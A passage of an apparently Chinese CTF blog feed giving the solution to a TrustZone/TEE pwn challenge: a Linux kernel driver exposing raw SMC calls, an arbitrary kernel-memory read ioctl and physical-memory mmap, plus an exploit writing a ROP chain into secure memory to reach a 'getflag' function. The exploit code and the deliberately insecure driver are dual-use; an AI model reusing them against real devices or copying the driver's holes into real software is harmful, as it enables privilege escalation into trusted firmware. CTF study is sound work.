class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/***************************************************************************/</span><span class="hljs-comment">/**</span><br><span class="hljs-comment">*  \file       driver.c</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">*  \details    Simple Linux device driver (IOCTL)</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">*  \author     EmbeTronicX</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">*  \Tested with Linux raspberrypi 5.10.27-v7l-embetronicx-custom+</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">*******************************************************************************/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kdev_t.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/cdev.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/device.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;linux/slab.h&gt;</span>                 <span class="hljs-comment">//kmalloc()</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;linux/uaccess.h&gt;</span>              <span class="hljs-comment">//copy_to/from_user()</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/page.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/pgtable.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/arm-smccc.h&gt;</span></span><br> <br><span class="hljs-type">dev_t</span> dev = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-keyword">class</span> *<span class="hljs-title">dev_class</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cdev</span> <span class="hljs-title">etx_cdev</span>;</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** Function Prototypes</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span>      __init <span class="hljs-title function_">etx_driver_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span>     __exit <span class="hljs-title function_">etx_driver_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span>      <span class="hljs-title function_">etx_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span>      <span class="hljs-title function_">etx_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span>  <span class="hljs-title function_">etx_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> len,<span class="hljs-type">loff_t</span> * off)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span>  <span class="hljs-title function_">etx_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span> * off)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">long</span>     <span class="hljs-title function_">etx_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span>      <span class="hljs-title function_">etx_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** File operation sturcture</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">fops</span> =</span><br>&#123;<br>        .owner          = THIS_MODULE,<br>        .read           = etx_read,<br>        .write          = etx_write,<br>        .open           = etx_open,<br>        .mmap           = etx_mmap,<br>        .unlocked_ioctl = etx_ioctl,<br>        .release        = etx_release,<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> smc_fid;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x1;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x2;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x3;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x4;<br>&#125; SmcArgs;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">size_t</span> addr;  <span class="hljs-comment">// ç”¨äºå­˜å‚¨ç‰©ç†åœ°å€</span><br>    <span class="hljs-type">size_t</span> size;       <span class="hljs-comment">// ç”¨äºå­˜å‚¨è¯»å–çš„å¤§å°</span><br>    <span class="hljs-type">size_t</span> recv_addr;<br>&#125;Arb_read_arg;<br><br>SmcArgs smcArg;<br>Arb_read_arg arb_read_arg;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-title function_">smc_call</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> smc_fid, </span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> arg1, </span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> arg2, </span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> arg3,</span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> arg4,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> arm_smccc_res *res</span><br><span class="hljs-params">    )</span>&#123;<br>    arm_smccc_smc(smc_fid, arg1, arg2, arg3, arg4, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, res);<br>    <span class="hljs-keyword">return</span> res-&gt;a0;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">etx_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset = vma-&gt;vm_pgoff;<br><br>    <span class="hljs-keyword">if</span> (offset &gt;= __pa(high_memory) || (filp-&gt;f_flags &amp; O_SYNC))<br>        vm_flags_set(vma, vma-&gt;vm_flags | VM_IO);<br>    vm_flags_set(vma, vma-&gt;vm_flags | (VM_DONTEXPAND | VM_DONTDUMP));<br><br>    <span class="hljs-keyword">if</span> (io_remap_pfn_range(vma, vma-&gt;vm_start, offset, <br>        vma-&gt;vm_end-vma-&gt;vm_start, vma-&gt;vm_page_prot))<br>        <span class="hljs-keyword">return</span> -EAGAIN;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** This function will be called when we open the Device file</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">etx_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br>        pr_info(<span class="hljs-string">&quot;Device File Opened...!!!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** This function will be called when we close the Device file</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">etx_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br>        pr_info(<span class="hljs-string">&quot;Device File Closed...!!!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** This function will be called when we read the Device file</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">etx_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span> *off)</span><br>&#123;<br>        pr_info(<span class="hljs-string">&quot;Read Function\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** This function will be called when we write the Device file</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">etx_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span> *off)</span><br>&#123;<br>        pr_info(<span class="hljs-string">&quot;Write function\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> len;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** This function will be called when we write IOCTL on the Device file</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">etx_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br>         <span class="hljs-keyword">switch</span>(cmd) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0x13370001</span>:<br>                        <span class="hljs-keyword">if</span>( copy_from_user(&amp;smcArg ,(SmcArgs*) arg, <span class="hljs-keyword">sizeof</span>(SmcArgs)) )<br>                        &#123;<br>                                pr_err(<span class="hljs-string">&quot;smc arg : Err!\n&quot;</span>);<br>                                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>                        &#125;<br>                        <span class="hljs-type">int</span> ret = smc_call(smcArg.smc_fid, smcArg.x1, smcArg.x2, smcArg.x3, smcArg.x4, (<span class="hljs-keyword">struct</span> arm_smccc_res *)&amp;smcArg);<br>                        pr_info(<span class="hljs-string">&quot;smc ret: 0x%llx\n&quot;</span>, ret);<br>                        copy_to_user((SmcArgs*) arg, &amp;smcArg, <span class="hljs-keyword">sizeof</span>(SmcArgs));<br>                        <span class="hljs-keyword">return</span> ret;<br>                        <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0x13370002</span>:<br>                        <span class="hljs-keyword">if</span>( copy_from_user(&amp;arb_read_arg ,(Arb_read_arg*) arg, <span class="hljs-keyword">sizeof</span>(Arb_read_arg)) )<br>                        &#123;<br>                                pr_err(<span class="hljs-string">&quot;smc arg : Err!\n&quot;</span>);<br>                                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>                        &#125;<br><br>                        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* ptr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)arb_read_arg.addr;<br>                        <span class="hljs-keyword">if</span>( copy_to_user((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)arb_read_arg.recv_addr, ptr,arb_read_arg.size) )<br>                        &#123;<br>                                pr_err(<span class="hljs-string">&quot;Data Read : Err!\n&quot;</span>);<br>                                <span class="hljs-keyword">return</span> <span class="hljs-number">-3</span>;<br>                        &#125;<br><br>                        <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                        pr_info(<span class="hljs-string">&quot;Default\n&quot;</span>);<br>                        <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br> <br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** Module Init function</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">etx_driver_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>        <span class="hljs-comment">/*Allocating Major number*/</span><br>        <span class="hljs-keyword">if</span>((alloc_chrdev_region(&amp;dev, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;etx_Dev&quot;</span>)) &lt;<span class="hljs-number">0</span>)&#123;<br>                pr_err(<span class="hljs-string">&quot;Cannot allocate major number\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        pr_info(<span class="hljs-string">&quot;Major = %d Minor = %d \n&quot;</span>,MAJOR(dev), MINOR(dev));<br> <br>        <span class="hljs-comment">/*Creating cdev structure*/</span><br>        cdev_init(&amp;etx_cdev,&amp;fops);<br> <br>        <span class="hljs-comment">/*Adding character device to the system*/</span><br>        <span class="hljs-keyword">if</span>((cdev_add(&amp;etx_cdev,dev,<span class="hljs-number">1</span>)) &lt; <span class="hljs-number">0</span>)&#123;<br>            pr_err(<span class="hljs-string">&quot;Cannot add the device to the system\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> r_class;<br>        &#125;<br> <br>        <span class="hljs-comment">/*Creating struct class*/</span><br>        <span class="hljs-keyword">if</span>(IS_ERR(dev_class = class_create(<span class="hljs-string">&quot;etx_class&quot;</span>)))&#123;<br>            pr_err(<span class="hljs-string">&quot;Cannot create the struct class\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> r_class;<br>        &#125;<br> <br>        <span class="hljs-comment">/*Creating device*/</span><br>        <span class="hljs-keyword">if</span>(IS_ERR(device_create(dev_class,<span class="hljs-literal">NULL</span>,dev,<span class="hljs-literal">NULL</span>,<span class="hljs-string">&quot;etx_device&quot;</span>)))&#123;<br>            pr_err(<span class="hljs-string">&quot;Cannot create the Device 1\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> r_device;<br>        &#125;<br>        pr_info(<span class="hljs-string">&quot;Device Driver Insert...Done!!!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <br>r_device:<br>        class_destroy(dev_class);<br>r_class:<br>        unregister_chrdev_region(dev,<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** Module exit function</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">etx_driver_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>        device_destroy(dev_class,dev);<br>        class_destroy(dev_class);<br>        cdev_del(&amp;etx_cdev);<br>        unregister_chrdev_region(dev, <span class="hljs-number">1</span>);<br>        pr_info(<span class="hljs-string">&quot;Device Driver Remove...Done!!!\n&quot;</span>);<br>&#125;<br> <br>module_init(etx_driver_init);<br>module_exit(etx_driver_exit);<br> <br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;EmbeTronicX &lt;embetronicx@gmail.com&gt;&quot;</span>);<br>MODULE_DESCRIPTION(<span class="hljs-string">&quot;Simple Linux device driver (IOCTL)&quot;</span>);<br>MODULE_VERSION(<span class="hljs-string">&quot;1.5&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p>exp.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DRIVER_PATH <span class="hljs-string">&quot;/dev/etx_device&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_SMC 0x13370001</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> smc_fid;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x1;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x2;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x3;<br>&#125; SmcArgs;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> devfd = open(DRIVER_PATH, <span class="hljs-number">2</span>);<br>    <span class="hljs-type">int</span> status = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> phys_addr = <span class="hljs-number">0x423DF000</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size = <span class="hljs-number">0x2000</span>;<br>    <span class="hljs-type">size_t</span> *ptr = mmap(<span class="hljs-literal">NULL</span>, size, PROT_READ|PROT_WRITE, <br>                    MAP_SHARED, devfd, phys_addr);<br><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++) &#123;<br>        ptr[i] = <span class="hljs-number">0xdeadbeef</span> + i;<br>    &#125;<br><br>    <span class="hljs-comment">// 0x000000000e0a01d4: mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;</span><br>    <span class="hljs-comment">// 0x000000000e0a1e6c: ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;</span><br><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;   <span class="hljs-comment">// 0x00</span><br>    ptr[i++] = <span class="hljs-number">0xe0a1e6c</span>;   <span class="hljs-comment">// 0x08</span><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x10</span><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x18</span><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x20</span><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x28</span><br><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x00</span><br>    ptr[i++] = <span class="hljs-number">0xe0a01d4</span>;   <span class="hljs-comment">// 0x08</span><br>    ptr[i++] = <span class="hljs-number">0xe0d735c</span>;   <span class="hljs-comment">// 0x10 flag</span><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x18</span><br><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x00</span><br>    ptr[i++] = <span class="hljs-number">0xe0a25ac</span>;   <span class="hljs-comment">// 0x08 getflag</span><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x10</span><br>    ptr[i++] = <span class="hljs-number">0xe0a1a7c</span>;   <span class="hljs-comment">// 0x18</span><br><br>    SmcArgs smc_arg = &#123;<span class="hljs-number">0xc3000000</span>, <span class="hljs-number">0x423DF000</span>, <span class="hljs-number">8</span>*i, <span class="hljs-number">0</span>&#125;;<br>    status = ioctl(devfd, CMD_SMC, &amp;smc_arg);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>tee</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 CISCNå†³èµ› pwn wp</title>
    <link href="/2024/07/29/2024%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bpwn-wp/"/>
    <url>/2024/07/29/2024%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bpwn-wp/</url>
    
